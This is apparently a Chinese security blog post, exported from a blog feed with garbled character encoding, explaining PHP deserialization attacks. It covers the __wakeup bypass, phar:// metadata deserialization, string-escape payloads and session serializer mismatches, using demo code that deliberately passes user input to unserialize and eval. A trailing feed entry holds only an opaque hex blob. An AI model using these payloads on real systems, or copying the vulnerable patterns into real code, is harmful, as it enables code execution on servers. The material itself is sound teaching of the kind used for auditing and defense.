‰ΩøÁî®var_dump()ÂáΩÊï∞ËæìÂá∫‰∏Ä‰∏™ÂØπË±°ÁöÑÂ±ûÊÄßÊó∂__debuginfoÊñπÊ≥ï‰ºöË¢´Ë∞ÉÁî®„ÄÇ È≠îÊúØÊñπÊ≥ïËß¶ÂèëÁöÑÊñπÊ≥ïÂ¶Ç‰∏ãÔºö 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151&lt;?phpclass Test&#123; public $public; protected $protected; private $private; function __construct() &#123; echo "construct"; echo "&lt;br&gt;"; &#125; function __toString() &#123; echo "toString"; echo "&lt;br&gt;"; return ""; &#125; function __call($name,$args) &#123; echo "call"; echo "&lt;br&gt;"; &#125; static function __callStatic($name,$args) &#123; echo "callStatic"; echo "&lt;br&gt;"; &#125; function __get($name) &#123; echo "get"; echo "&lt;br&gt;"; &#125; function __set($name,$value) &#123; echo "set"; echo "&lt;br&gt;"; &#125; function __isset($name) &#123; echo "isset"; echo "&lt;br&gt;"; &#125; function __unset($name) &#123; echo "unset"; echo "&lt;br&gt;"; &#125; function __invoke() &#123; echo "invoke"; echo "&lt;br&gt;"; &#125; static function __set_status($arr) &#123; echo "set_status"; echo "&lt;br&gt;"; &#125; function __clone() &#123; echo "clone"; echo "&lt;br&gt;"; &#125; function __debugInfo() &#123; echo "debugInfo"; echo "&lt;br&gt;"; return null; &#125; public function __serialize(): array &#123; echo "serialize"; echo "&lt;br&gt;"; return [ 'public' =&gt; $this-&gt;public, 'protected' =&gt; $this-&gt;protected, 'private' =&gt; $this-&gt;private, ]; &#125; function __unserialize(array $data): void &#123; echo "unserialize"; echo "&lt;br&gt;"; &#125; function __sleep() &#123; echo "sleep"; echo "&lt;br&gt;"; return array('public', 'protected', 'private'); &#125; function __wakeup() &#123; echo "wakeup"; echo "&lt;br&gt;"; &#125; function __destruct() &#123; echo "destruct"; echo "&lt;br&gt;"; &#125;&#125;// construct$test = new Test();// toStringecho $test;// call$test-&gt;fun();// callStaticTest::fun();// getecho $test-&gt;private;// set$test-&gt;private = "private";// issetisset($test-&gt;private);// unsetunset($test-&gt;private);// invoke$test();// set_statuseval(var_export($test,true).";");// clone$test1 = clone $test;// debugInfovar_dump($test);echo "&lt;br&gt;";// serialize$ser = serialize($test);// unserialize$unser = unserialize($ser);unset($test);unset($test1); È°∫‰æøËØ¥‰∏ãÔºå__serializeÂíå__unserializeËøô‰∏§‰∏™ÁâπÊÄßÂú®php7.4‰ª•ÂêéÊâçÊúâÊïà„ÄÇ PHPÂèçÂ∫èÂàóÂåñÁâπÊÄß__wakeupÁªïËøá__wakeupÁªïËøáÂà©Áî®ÁöÑ‰∏çÊòØphpÁöÑÊüê‰∏™ÁâπÊÄßÔºåËÄåÊòØ‰∏Ä‰∏™ÊúâCVEÁºñÂè∑ÁöÑÊºèÊ¥ûÔºå‰∏çËøáÂú®ÊàëÁúãÊù•Âè™ÊòØ‰∏™bugÔºå‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàËÉΩÂàÜÂà∞CVEÁºñÂè∑„ÄÇÂèóÂΩ±ÂìçÁöÑÁâàÊú¨‰∏∫PHP5ÁöÑ5.6.25‰ª•‰∏ãÂíåPHP7ÁöÑ7.0.10‰ª•‰∏ã„ÄÇÊºèÊ¥ûÁöÑÂà©Áî®ÂæàÁÆÄÂçïÔºöÂΩìÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤‰∏≠ÊèèËø∞ÂØπË±°Â±ûÊÄß‰∏™Êï∞ÁöÑÊï∞Â≠óÊØîÂÆûÈôÖÁöÑÂ±ûÊÄß‰∏™Êï∞Â§ßÔºåÂàôÂèçÂ∫èÂàóÂåñÊó∂__wakeupÊñπÊ≥ïÂàô‰∏çÊâßË°å„ÄÇ Âà©Áî®Âú∫ÊôØÂòõÔºåÂ∞±ÊòØ‰ª•‰∏ãËøôÁßç__wakeupÊñπÊ≥ïÊúâÊõøÊç¢ÊàñËÄÖËøáÊª§ÁöÑÊÉÖÂÜµ„ÄÇ 123456789101112131415&lt;?phpclass Weakup&#123; var $command; function __wakeup()&#123; $this-&gt;command = "phpinfo();"; &#125; function __destruct()&#123; @eval($this-&gt;command); &#125;&#125;$obj = unserialize($_GET['obj']); ‰ª•‰∏äpayload‰∏≠ÔºåÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÊèèËø∞Â±ûÊÄßÊúâ‰∏§‰∏™Ôºå‰ΩÜÂÆûÈôÖÂè™Êúâ‰∏Ä‰∏™ÔºåÁªïËøá‰∫Ü__wakeupÔºåcommandÂèÇÊï∞Ê≤°ÊúâË¢´ÊõøÊç¢‰∏∫phpinfoÔºåÊâßË°å‰∫ÜÊàë‰ª¨ÁöÑdirÂëΩ‰ª§„ÄÇ pharÂèçÂ∫èÂàóÂåñÁõ¥Êé•ÁöÑphpÂèçÂ∫èÂàóÂåñ‰ΩøÁî®ÁöÑÊòØunserializeËøô‰∏™ÂáΩÊï∞Ôºå‰ΩÜÂæàÂ§öÊó∂ÂÄô‰∏ç‰∏ÄÂÆö‰ºöÊúâËøô‰∏™ÂáΩÊï∞ÔºåËøô‰∏™ÂèØ‰ª•Âà©Áî®pharÂÆûÁé∞ÂèçÂ∫èÂàóÂåñ„ÄÇpharÊòØphpÁöÑÂΩíÊ°£Êñá‰ª∂Ôºåphar‰∏≠Êúâ‰∏ÄÂ§ÑÂ≠òÂÇ®Â∫èÂàóÂåñÂêéÁöÑmate-data‰ø°ÊÅØÔºåÈÄöËøáphar://‰º™ÂçèËÆÆÔºåÈÖçÂêàÊüê‰∫õÊñá‰ª∂ÂáΩÊï∞Â∞±ÂèØ‰ª•ËøõË°åphpÂèçÂ∫èÂàóÂåñ„ÄÇ ÁîüÊàêPharÂΩíÊ°£Êñá‰ª∂ÁöÑ‰ª£Á†ÅÂ¶Ç‰∏ãÔºå‰ªéseebug‰∏äCV‰∏ãÊù•ÁöÑÔºåsetMetadataÊñπÊ≥ïÁöÑÂèÇÊï∞Â∞±ÊòØÈúÄË¶ÅÂ∫èÂàóÂåñÁöÑÂØπË±°„ÄÇ 1234567891011121314&lt;?php class TestObject &#123; &#125; @unlink("phar.phar"); $phar = new Phar("phar.phar"); //ÂêéÁºÄÂêçÂøÖÈ°ª‰∏∫phar $phar-&gt;startBuffering(); $phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;"); //ËÆæÁΩÆstub $o = new TestObject(); $phar-&gt;setMetadata($o); //Â∞ÜËá™ÂÆö‰πâÁöÑmeta-dataÂ≠òÂÖ•manifest $phar-&gt;addFromString("test.txt", "test"); //Ê∑ªÂä†Ë¶ÅÂéãÁº©ÁöÑÊñá‰ª∂ //Á≠æÂêçËá™Âä®ËÆ°ÁÆó $phar-&gt;stopBuffering();?&gt; Á¨¨‰∏ÄÊ¨°ËøêË°åÂèØËÉΩ‰ºöÊä•pharÊó†Ê≥ïÁîüÊàêÁöÑÈóÆÈ¢òÔºåÊåâÁÖßÊä•Èîô‰ø°ÊÅØÂú®ÈÖçÁΩÆÊñá‰ª∂‰∏≠Êääphar.readonlyÂÖ≥Èó≠Âç≥ÂèØ„ÄÇ ÊâìÂºÄÁîüÊàêÁöÑpharÂΩíÊ°£Êñá‰ª∂ÔºåÂú®ÈáåÈù¢ÂèØ‰ª•ÁúãÂà∞Â∫èÂàóÂåñÂêéÁöÑTestObjectÂØπË±°„ÄÇ ÁÑ∂ÂêéÂ∞±ÂèØ‰ª•‰ΩøÁî®Êñá‰ª∂ÂáΩÊï∞ÈÖçÂêàphar:\\‰º™ÂçèËÆÆÔºåËøõË°åphpÂèçÂ∫èÂàóÂåñ„ÄÇÂèØÁî®ÁöÑÊñá‰ª∂ÂáΩÊï∞Â¶Ç‰∏ãÔºå‰πüÊòØÁî®ÁöÑseebugÁöÑÂõæ„ÄÇ ÂÜô‰∏™DemoÊµãËØï‰∏ãÔºö 1234567891011121314151617181920212223&lt;?phpclass TestObject&#123; var $command; function __wakeup() &#123; @eval($this-&gt;command); &#125;&#125;@unlink("phar.phar");$phar = new Phar("phar.phar");$phar-&gt;startBuffering();$phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;");$o = new TestObject();$o-&gt;command = "phpinfo();";$phar-&gt;setMetadata($o);$phar-&gt;addFromString("test.txt", "test");$phar-&gt;stopBuffering();file_get_contents("phar://phar.phar/test.txt");?&gt; È°∫‰æøËØ¥‰∏ãÔºåÊàëÁî®php8ÊµãËØïphar:\\‰º™ÂçèËÆÆÁöÑÊó∂ÂÄôÂèëÁé∞ÂÆÉ‰∏ç‰ºöËøõË°åÂèçÂ∫èÂàóÂåñ‰∫Ü„ÄÇÁΩë‰∏äÊü•‰∫Ü‰∏ãÔºåPÁ•ûÁöÑÊñáÁ´†ÈáåËØ¥php8ÈáåÁöÑPhar‰∏≠ÁöÑÂÖÉ‰ø°ÊÅØ‰∏çÂÜçËá™Âä®ËøõË°åÂèçÂ∫èÂàóÂåñ‰∫Ü„ÄÇ ÂÖ≥‰∫épharÂèçÂ∫èÂàóÂåñËøòÊúâ‰∏§‰∏™trickÔºåÂΩì‰ª£Á†Å‰∏≠ÊúâËøáÊª§Ôºå‰º†ÂÖ•ÁöÑÊñá‰ª∂Âêç‰∏çËÉΩ‰ª•phar://ÂºÄÂ§¥Ôºå‰ΩÜÂú®ÂâçÈù¢Âä†‰∏äcompress.zlib://ËøòÊòØËÉΩÂèçÂ∫èÂàóÂåñÔºõpharÂΩíÊ°£Êñá‰ª∂ÁöÑstubÊ†áÂøóÂè™ÈúÄ__HALT_COMPILER(); ?&gt;ÔºåÂâçÈù¢ÂèØÂä†‰∏ä‰ªª‰ΩïÂÜÖÂÆπÔºåÂèØ‰ª•ÁªïËøáÊñá‰ª∂Â§¥Ê£ÄÊµãÁöÑÊñá‰ª∂‰∏ä‰º†„ÄÇ Â≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏Âú®php‰∏≠ÊòØÈù†ÊèèËø∞ÁöÑÈïøÂ∫¶Êù•ËØÜÂà´Â≠óÁ¨¶‰∏≤ÂèòÈáèÂºÄÂßã‰∏éÁªìÊùüÔºå‰ª•ÂàÜÂè∑;Êù•ÂàÜÈöîÔºå‰ª•Ëä±Êã¨Âè∑}Êù•‰ª£Ë°®ÂØπË±°ÊàñÊï∞ÁªÑÁöÑÁªìÊùüÔºåÊâÄ‰ª•ÂÉè‰∏ãÂàó‰ª£Á†Å‰∏ÄÊ†∑ÔºåÂ≠óÁ¨¶‰∏≤ÂèòÈáè‰∏≠ÁöÑÂèåÂºïÂè∑Ëä±Êã¨Âè∑ÊàñÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÂêéÂä†‰∏äÁÇπÂÜÖÂÆπ‰πü‰∏ùÊØ´‰∏çÂΩ±ÂìçÂèçÂ∫èÂàóÂåñ„ÄÇ 123456789101112&lt;?phpclass Test&#123; var $test;&#125;$unser1 = 'O:4:"Test":1:&#123;s:4:"test";s:12:"testtest"&#125;&#125;&#125;";&#125;';$unser2 = 'O:4:"Test":1:&#123;s:4:"test";s:12:"testtesttest";&#125;""""&#125;&#125;&#125;&#125;';var_dump(unserialize($unser1));echo "&lt;br&gt;";var_dump(unserialize($unser2)); Âõ†‰∏∫ËøôÁßçÁâπÊÄßÔºåÂ¶ÇÊûúÂú®Â∫èÂàóÂåñÂêéÂØπÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ËøõË°åËøáÊª§ÊàñÊõøÊç¢Ôºå‰ΩøÂæóÊõøÊç¢ÂâçÂêéÁöÑÈïøÂ∫¶ÂèëÁîüÂèòÂåñÔºå‰∏ÄËæπÊÉÖÂÜµ‰∏ã‰ºöÂØºËá¥ÂèçÂ∫èÂàóÂåñÂá∫ÈîôÔºåÂú®Âä†‰ª•Âà©Áî®ÂèØÈÄ†ÊàêÂ≠óÁ¨¶‰∏≤ÁöÑÈÄÉÈÄ∏Ôºå‰øÆÊîπÂÖ∂‰ªñÂèÇÊï∞ÁöÑÂÄº„ÄÇ Ê†πÊçÆÊõøÊç¢ÂâçÂêéÁöÑÈïøÂ∫¶ÂèòÂåñÔºåÂèØÂ∞ÜÊÉÖÂÜµË∑ü‰∏∫‰∏§ÁßçÔºöÊõøÊç¢ÂêéÈïøÂ∫¶ÂèòÈïø„ÄÅÊõøÊç¢ÂêéÈïøÂ∫¶ÂèòÁü≠Ôºå‰ª•‰∏ãÂàÜÂà´ÂàÜÊûêËøô‰∏§ÁßçÊÉÖÂÜµ„ÄÇ ÊõøÊç¢ÂêéÈïøÂ∫¶ÂèòÈïø12345678910111213141516171819&lt;?phpclass Test&#123; var $test; var $command; function __wakeup() &#123; @eval($this-&gt;command); &#125;&#125;$test = new Test();$test-&gt;command = "phpinfo();";$test-&gt;test = $_GET["test"];$ser = serialize($test);$ser = str_replace("z", "zz", $ser);var_dump(unserialize($ser)); Ëøô‰∏™DemoÁöÑÁõÆÁöÑÊòØË¶ÅÊääcommondÂ±ûÊÄßÊõøÊç¢‰∏∫Êàë‰ª¨ÁöÑÂëΩ‰ª§ÔºåÈúÄË¶ÅÈÄÉÈÄ∏ÁöÑÂ≠óÁ¨¶‰∏≤‰∏∫&quot;;s:7:&quot;command&quot;;s:14:&quot;system(&#39;dir&#39;);&quot;;}ÔºåÊõøÊç¢ÂâçÂêéÁöÑÈïøÂ∫¶ÂèòÂåñ‰∏∫Áî±1Âèò2ÔºåÈÇ£‰ª§zÁöÑÈïøÂ∫¶Á≠â‰∫éÈúÄË¶ÅÈÄÉÈÄ∏ÁöÑÂ≠óÁ¨¶‰∏≤ÁöÑÈïøÂ∫¶Âç≥ÂèØÔºåÊúÄÁªàpayload‰∏∫Ôºö 1zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz&quot;;s:7:&quot;command&quot;;s:14:&quot;system(&apos;dir&apos;);&quot;;&#125; ÊõøÊç¢ÂêéÈïøÂ∫¶ÂèòÁü≠123456789101112131415161718192021&lt;?phpclass Test&#123; var $test1; var $test2; var $command; function __wakeup() &#123; @eval($this-&gt;command); &#125;&#125;$test = new Test();$test-&gt;command = "phpinfo();";$test-&gt;test1 = $_GET["test1"];$test-&gt;test2 = $_GET["test2"];$ser = serialize($test);$ser = str_replace("ab", "", $ser);var_dump(unserialize($ser)); ÊõøÊç¢ÂêéÈïøÂ∫¶Áî±ÈïøÂèòÁü≠Ôºå‰ºº‰πéÈúÄË¶ÅËá≥Â∞ë‰∏§‰∏™Â±ûÊÄßÂèØÊéßÊâçËÉΩÈÄÉÈÄ∏Â≠óÁ¨¶‰∏≤„ÄÇÁ¨¨‰∏Ä‰∏™Â±ûÊÄßÁî®‰∫éÂáèÂ∞ëÂáèÁü≠ÈïøÂ∫¶ÔºåÁ¨¨‰∫åÂ≠óÁ¨¶‰∏≤Áî®‰∫éÈÄÉÈÄ∏Â≠óÁ¨¶‰∏≤ÔºåÈúÄË¶ÅÂáèÂ∞ëÁöÑÈïøÂ∫¶‰∏∫Á¨¨‰∏Ä‰∏™Â±ûÊÄßÁöÑÂÜÖÂÆπÂà∞Á¨¨‰∫å‰∏™Â±ûÊÄßÈúÄË¶ÅÈÄÉÈÄ∏ÁöÑÂ≠óÁ¨¶‰∏≤‰πãÈó¥ÁöÑË∑ùÁ¶ª„ÄÇÊúÄÁªàpayload‰∏∫‰ª•‰∏ãÂÜÖÂÆπ„ÄÇÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÈïøÂ∫¶ÂáèÁü≠ÂêéÔºåtest2Â±ûÊÄßÂ∞±Ë¢´ÂêûÊéâ‰∫ÜÔºåÈÄÉÈÄ∏Êó∂ÈúÄË¶ÅÂä†‰∏Ä‰∏™Â±ûÊÄß‰ΩøÂæóÂ±ûÊÄßÊï∞Èáè‰∏∫3ÔºåÊâçËÉΩÊ≠£Â∏∏ÂèçÂ∫èÂàóÂåñ„ÄÇÁî±‰∫éphp‰∏çÂ≠òÂú®ÁöÑÂ±ûÊÄß‰πüËÉΩË¢´ÂèçÂ∫èÂàóÂåñÁöÑÁâπÊÆäÔºåËøôÈáåÈöè‰æøÂä†‰∏™Â±ûÊÄßÂç≥ÂèØ„ÄÇ 1test1=abababababababababab&amp;test2=&quot;;s:7:&quot;command&quot;;s:14:&quot;system(&apos;dir&apos;);&quot;;i:1;s:1:&quot;a&quot;;&#125; sessionÂèçÂ∫èÂàóÂåñphp‰∏≠ÁöÑsession‰∏ÄËà¨‰ª•Êñá‰ª∂ÂΩ¢ÂºèÂ≠òÂÇ®ÔºåÂ≠òÂÇ®ÁöÑÊ†ºÂºèÂèà‰∏∫Â∫èÂàóÂåñÊ†ºÂºè„ÄÇphpÁöÑsessionÂ∫èÂàóÂåñÂ§ÑÁêÜÂô®Êúâ‰∏âÁßçÔºåÂàÜÂà´‰∏∫php„ÄÅphp_serializeÂíåphp_binaryÔºåÈÄöËøáphp.ini‰∏≠ÁöÑsession.serialize_handlerËÆæÁΩÆÔºåÈªòËÆ§‰∏∫php„ÄÇ phpÂ∫èÂàóÂåñÂ§ÑÁêÜÂô® 12345&lt;?phpini_set('session.serialize_handler','php');session_start();$_SESSION["test"]="session"; sessionÁöÑÊ†ºÂºè‰∏∫ÔºöÈîÆÂä†‰∏äÂàÜÈöîÁ¨¶|Âä†‰∏äÂ∫èÂàóÂåñÂÜÖÂÆπ„ÄÇ php_serializeÂ∫èÂàóÂåñÊéßÂà∂Âô® 12345&lt;?phpini_set('session.serialize_handler','php_serialize');session_start();$_SESSION["test"]="session"; sessionÁöÑÊ†ºÂºè‰∏∫Ôºö$_SESSIONËøô‰∏™Êï∞ÁªÑÁöÑÂ∫èÂàóÂåñÂÜÖÂÆπ„ÄÇ php_binaryÂ∫èÂàóÂåñÂ§ÑÁêÜÂô® 12345&lt;?phpini_set('session.serialize_handler','php_binary');session_start();$_SESSION["test"]="session"; sessionÁöÑÊ†ºÂºè‰∏∫Ôºö‰∏Ä‰∏™Â≠óËäÇËÆ∞ÂΩïÈîÆÁöÑÈïøÂ∫¶ÔºåÁÑ∂ÂêéÊãº‰∏äÈîÆÔºåÂÜçÊãº‰∏äÂ∫èÂàóÂåñÂÜÖÂÆπ„ÄÇËøôÈáåÈîÆtestÁöÑÈïøÂ∫¶‰∏∫4ÔºåÊâÄ‰ª•ËÆ∞ÂΩïÁöÑÈîÆÈïøÂ∫¶ÁöÑÂ≠óËäÇ‰∏∫04„ÄÇ ÂΩìÁ®ãÂ∫èÂëòÊ∑∑Áî®Â∫èÂàóÂåñÊéßÂà∂Âô®Êó∂ÔºåÁî±‰∫ésessionÂÜÖÂÆπÁöÑËß£ÊûêÊñπÂºè‰∏çÂêåÔºåÂÜçÁ≤æÂøÉÊûÑÈÄ†‰∏ãÂèØÈÄ†ÊàêÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇÁΩë‰∏äÁöÑÊñáÁ´†Â§ßÈÉΩÊòØphp_serialize‰øùÂ≠òsessionÔºåphpËØªÂèñsessionËøôÁßçÊñπÂºèÈÄ†ÊàêÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÔºåËøôÈáåÂ∞±ÂÖàÊé¢ËÆ®ËøôÁßçÊñπÂºè„ÄÇ php_serializeËΩ¨php123456// php_serialize.php&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();$_SESSION["test"] = $_GET["test"]; 12345678910111213141516// php.php&lt;?phpini_set('session.serialize_handler','php');session_start();class Test&#123; var $command; function __wakeup() &#123; @eval($this-&gt;command); &#125;&#125; ÂΩìtest‰º†ÂÖ•ÁöÑÂÜÖÂÆπ‰∏∫|O:4:&quot;Test&quot;:1:{s:7:&quot;command&quot;;s:10:&quot;phpinfo();&quot;;}Ôºå‰øùÂ≠òsessionÊó∂Ôºåphp_serializeÁõ¥Êé•Â∫èÂàóÂåñ$_SESSIONÊï∞ÁªÑÔºõËØªÂèñsessionÊó∂ÔºåÁî±phpËß£ÊûêÔºåÁî±‰∫éÊúâ‰∏Ä‰∏™ÂàÜÈöîÁ¨¶|ÔºåÂàÜÈöîÁ¨¶ÂâçÁöÑÂÜÖÂÆπË¢´ÂΩìÊàêÈîÆÔºåÂàÜÈöîÁ¨¶ÂêéÁöÑÂÜÖÂÆπË¢´ÂΩìÊàêÂ∫èÂàóÂåñÂÜÖÂÆπÔºåÂπ∂‰ºöË¢´Ëá™Âä®ÁöÑÂèçÂ∫èÂàóÂåñÔºåÁÑ∂ÂêéËá™Âä®Ë∞ÉÁî®È≠îÊúØÊñπÊ≥ï__wakeupÔºåÊâßË°å‰∫Üphpinfo„ÄÇ php_binaryËΩ¨phppayload‰∏éphp_serializeËΩ¨phpÁöÑÈÄöÁî®ÔºåËøôÈáåÂ∞±‰∏çÁªÜËØ¥‰∫Ü„ÄÇ php_binaryËΩ¨php_serializephp_serializeÂ∫èÂàóÂåñÂ§ÑÁêÜÂô®Ë¶ÅËÉΩÂèçÂ∫èÂàóÂåñÔºåphp_binaryÁõ∏Â∫îÁöÑÂ∞±ÈúÄË¶Å‰ª•aÂºÄÂ§¥ÔºåÊâÄ‰ª•ÈîÆÈïøÂ∫¶Ë¶Å‰∏∫116„ÄÇÊÄªÁöÑÊù•ËØ¥ÔºåËøôÁßçÊÉÖÂÜµÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåÈúÄË¶ÅsessionÁöÑÈîÆÂèØÊéßÊâçÂèØÂÆûÁé∞‰∫Ü„ÄÇ ÊúÄÂêéÁöÑpocÊòØËøôÊ†∑ÔºåÂêéÈù¢‰∏Ä‰∏≤aÁî®Êù•Â°´ÂÖÖÈïøÂ∫¶Âà∞116Ôºö 1234&lt;?phpini_set('session.serialize_handler', 'php_binary');session_start();$_SESSION[':1:&#123;s:1:"a";O:4:"Test":1:&#123;s:7:"command";s:10:"phpinfo();";&#125;;&#125;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'] = "a"; php_serializeËΩ¨php_binaryphp_serializeÂ§ÑÁêÜÂô®ÂºÄÂ§¥ÊÄªÊòØaÔºåËΩ¨Âà∞php_binaryËß£ÊûêÈîÆÈïøÂ∫¶ÈúÄË¶Å‰∏∫116ÔºåÊâÄ‰ª•Â°´ÂÖÖÈúÄË¶ÅÊîæÂú®ÂºÄÂ§¥ÔºåÂä†‰∏äÂÖ∂‰ªñÁöÑÂ∫èÂàóÂåñÂÜÖÂÆπÁöÑÈïøÂ∫¶Ë¶Å‰∏∫116„ÄÇÂõ†‰∏∫DemoÈáåÂè™Êúâ‰∏Ä‰∏™ÈîÆÂÄºÂØπÔºåÊâÄ‰ª•payloadÁöÑÊûÑÈÄ†ÁÆÄÂçïÁÇπÔºåÂ¶ÇÊûúÂ≠òÂú®ÂÖ∂‰ªñÁöÑÈîÆÂÄºÂØπÔºåÊûÑÈÄ†Â∞±Èáå‰ºöÂ§çÊùÇÁÇπÔºåÁîöËá≥Ê≤°Ê≥ïÊûÑÈÄ†„ÄÇ 1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaO:4:&quot;Test&quot;:1:&#123;s:7:&quot;command&quot;;s:10:&quot;phpinfo();&quot;;&#125; ‰ª•‰∏äpayloadÂú®php_serializeÂ∫èÂàóÂåñÂ§ÑÁêÜÂô®‰∏ãÁîüÊàêÁöÑsessionÔºåÂú®php_binaryÈáåÁöÑËß£ÊûêÊñπÂºèÂ¶Ç‰∏ãÔºö sessionÂèçÂ∫èÂàóÂåñÂ∞èÁªìÂÖ∂‰ªñÁªÑÂêàÁöÑsessionÂèçÂ∫èÂàóÂåñË∑ü‰ª•‰∏äÂá†‰∏™‰πüÂ§ßÂêåÂ∞èÂºÇÔºåÊÄªÁöÑÊù•ËØ¥Ôºå‰∏ªË¶ÅÂõ¥ÁªïÁùÄÈ¶ñÂ≠óËäÇÂíåÂàÜÈöîÁ¨¶|ÊûÑÈÄ†payload„ÄÇÈô§‰∫ÜËΩ¨phpÁöÑÔºå‰πüÂ∞±ÊòØÂàÜÈöîÁ¨¶ÈÄ†ÊàêÁöÑÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂ§ñÔºåÂÖ∂‰ªñÁªÑÂêàÁöÑsessionÂèçÂ∫èÂàóÂåñÔºåÈúÄË¶ÅÈîÆÂêçÂèØÊéß„ÄÅsessionÂÜÖÂÆπÂ∑≤Áü•„ÄÅÂèØÊéßÈîÆÂÄºÂØπÂú®session‰∏≠Èù†ÂâçÁ≠âÊù°‰ª∂ÔºåÂà©Áî®ÈöæÂ∫¶ËøòÊòØÊå∫È´òÁöÑ„ÄÇ ÂêéËÆ∞PHPÂèçÂ∫èÂàóÂåñÊµÖÊûêÁªà‰∫éÂÜôÂÆå‰∫ÜÔºåÊó∂Èó¥ÊØîÊàëÈ¢ÑÊúüÁöÑË¶Å‰πÖ„ÄÇÊ∞¥ÊñáÁ´†‰πüÊòØ‰∏çËÉΩÂÅ∑ÊáíÊª¥ÔºåÂ∏åÊúõÂêéÈù¢ÁöÑÂ≠¶‰π†ÊèêÈ´ò‰∏ãÊïàÁéáÂêßÔºå‰∏ã‰∏ÄÁ´ôÔºåÂêëJavaÂèçÂ∫èÂàóÂåñËøõÂèëÔºÅ ÂèÇËÄÉhttps://www.php.net/manual/en/language.oop5.magic.php https://paper.seebug.org/680/ https://www.leavesongs.com/PHP/php-8-0-release.html https://blog.csdn.net/qq_45521281/article/details/107135706]]></content>
      <categories>
        <category>‰ª£Á†ÅÂÆ°ËÆ°</category>
      </categories>
      <tags>
        <tag>ÂèçÂ∫èÂàóÂåñ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Âü∫‰∫éASP.NET MVCÁöÑeasycmsÁöÑeasy‰ª£Á†ÅÂÆ°ËÆ°]]></title>
    <url>%2F2021%2F07%2F09%2F%E5%9F%BA%E4%BA%8EASP.NET_MVC%E7%9A%84easycms%E7%9A%84easy%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[4630436162ade97ba2718b7d0c4b3b63e244e44e44b3aaff61d8624b3ae55323b1b3363053478eb95a51fe488060c89e1c837f3ef59a5005b0efa9f918eac767f34bfec09066dbd844f27b991fe581ba6fbe0ee8520865ee5552763af42642e6766f7aa971c3158a9f15016d48e86532820839ebc92dc13654dd71b9139887d0e282e910a7f8c0740c1bb37f798b6f38f61558a06001d47522ebdf96a2a052a5c1cefdf985a00190d6755c855a7da5c98b2c12945ce6bd43cb537fab16fd733c4279e04581e5e7d32bdeff06b990db806d34105d506f0bb3b6bc1ed8d78ae0bd0d0435285aeeb1bdbb6dce1052cd8833e1dcbb8df766da5b0c3b9f85c253ab6bd88bd2fd9c4023076951a61387c5c81f83454d48ac52d776526d53ae598f0de3b36e464e31494ae2259c6d4e10701ebbe613af7e3713523ab62971291deb5dfc8bb8b2c5b83ba948875b13cdcf834af1c7a57c7afe9c56801f6a4b08d6cf82b2e3378c2120f3c37a94aaea1e4468a279879ee884e9fa00f17bf4e80f9b7fea9f8175849b7939a85750bf25fbd7664edb0f4576ea52739ff8cc00a8f0aba81988669afa6caf9553d661f91ffa134d26aaa6b309eb5c68f912e9990cd013221190605c0124ee6ae3efe0e4eabf235b1a304cc3cb592dafedf7b2532cad23e1b18940bfc64eafee1b347337033523b8ef6512384c8403651a3d9b2a2d375d90f65281ea76960b58796d0a1a563d7a2c4d0a56f95effa12ced4cad5f67fd38d62d257fe2f3870adcc1810b4f9aebf523fa3f327109e05f5ae4d58aa460dbcdf012f7fc83d955aa6921105975107f2654774c052a1ff4b57f7a0521ef21e0284766a3c479415afdc68f9c7857b5a3b9aca30a44b027412e8ca7ccc4bfc5f734162b41ab01aa097c1df18cf1d27a503e8e2a4550efcce4eed76ba0b62ec1f52b3163f35676225a13793f3432aba9586fd883c98152227cba38c0678eedffbeda027a931de2662a06561cfcc99e455c66d923f7fa2c0e0449cf527189d8c0d822bd6835baea964357a129090d48eb2e2add79cabd7fa21ce02af484c23065bfdff0a94c9776eff571bdec4b880248fb34a18febadd98a9a0945814bd1af46648e07d3e02ee7de53d64f7e4a6dc93efa9c5622611c552dd8ef431f5d544f3430bd9b773a5cdc47e6058bc9534bac338b9aca406fd6bd9a6c594d8a825b811f109bf5b4ba28d888f97334fc7b9b551982bc49787dc98297711d00b64b517513c69f140e56655e22d1744c03a226121cf52bb47e36d8eb92dbdcfb03636f75fdb9c079286da75094e9f48824ee2ef9c0ed49ade7f1194f4c24b45e7d446b7f34597c4953185ad9f0501357929c915c7f13c8f0883502f786be47059ca15cfd0b08a01250cd6c7b7fe79c99dd5c6d7c00efe874b90cbbebd8c2987c312b923cddac16e3544c9e3504187bdad6230472beb0b18878c8fa649923cc397c69eaf11cee2d66885c6623b7762c6c86cdcacc5d06bbfd43b637da649ee162ce25c3b8abf8c0e7321ac2820f8858a8811bb2fced01ea33eb61a50b7562c602200e9b3c88fda6cf2843f46d808fd7d65af5af7081f521b1289486973e6cf80cf9b1664425ef0adef09e9feea5f382f3cf0a2e5226e5a336204c9672f67a9b1ad4a3c838d75976355a2a402124acd7ef5a88957c411e67fe821cce17ca99b8befcea77e2e2030874131b8e20e1db2cdb65659933d5fa92cf08a5e3dbeebbc0f6cdbe73b699cc26f4c8e5593d76941af70993c6b07453fbe5ee0de6441f01ab111b6f12b2763e2d72471301c9639b6848511facf5aacf3c2fa62a2181bf09ddf0f3d02dc9e418c7d99ea24056d577479360e16fe6b93f60966edb6c88d1c177fbbd2fd96cb59ad530063cf112aad774d46aad6dc